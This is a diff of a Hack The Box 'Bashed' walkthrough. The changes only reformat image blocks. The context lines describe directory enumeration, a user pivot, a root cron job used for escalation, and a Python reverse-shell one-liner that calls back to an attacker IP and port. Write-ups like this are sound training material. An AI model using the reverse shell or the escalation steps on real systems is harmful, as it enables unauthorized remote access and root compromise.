@@ -1,10 +1,6 @@
 # Bashed
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (2).png" alt="" width="75"><figcaption><p>hackthebox.com - © HACKTHEBOX</p></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (2) (1).png" alt="" width="75"><figcaption><p>hackthebox.com - © HACKTHEBOX</p></figcaption></figure></div>
 
 🔗 [Bashed](https://www.hackthebox.com/machines/bashed)
 
@@ -93,11 +89,7 @@ http://bashed.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPSer
 gobuster dir -u http://bashed.htb -w /usr/share/wordlists/dirb/common.txt
 ```
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure></div>
 
 Very good, we've found interisting web dir such as /dev and /uploads, exploring them we can answer at our question.
 
@@ -149,11 +141,7 @@ scriptmanager
 
 Going into root dir / we can launch ls -l and see all permissions regarding directories.
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure></div>
 
 {% hint style="info" %}
 /scripts
@@ -169,11 +157,7 @@ But, we decide to give a reverse shell on our attacker machine to optimize our w
 export RHOST="10.10.14.6";export RPORT=1339;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 ```
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure></div>
 
 Remembering the question's hint and the last task, where only the scriptmanager can access the /scripts folder, we can access it as the scriptmanager user spawning a a bash shell
 
@@ -185,11 +169,7 @@ Trying to use sudo -l commands, the system asks us for a password that we don't 
 
 Now, we've permissions access to /scripts dir, where we found two files:
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure></div>
 
 Additionally, the program `test.py` appears to be scheduled to execute almost every minute, based on the last access time of `test.txt`. From this, we can infer that there may be a cron job owned by root that automatically runs `test.py` every minute. We can confirm this by renaming `test.txt` (e.g., to `test.txt.old`) and observing that a new `test.txt` file is created after a minute or so."
 
@@ -217,11 +197,7 @@ test.py
 
 Immediately before or at least within two minutes we listen with netcat on the attacker machine, and we obtain a shell with root permissions.
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+<div align="left"><figure><img src="../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure></div>
 
 <details>
 
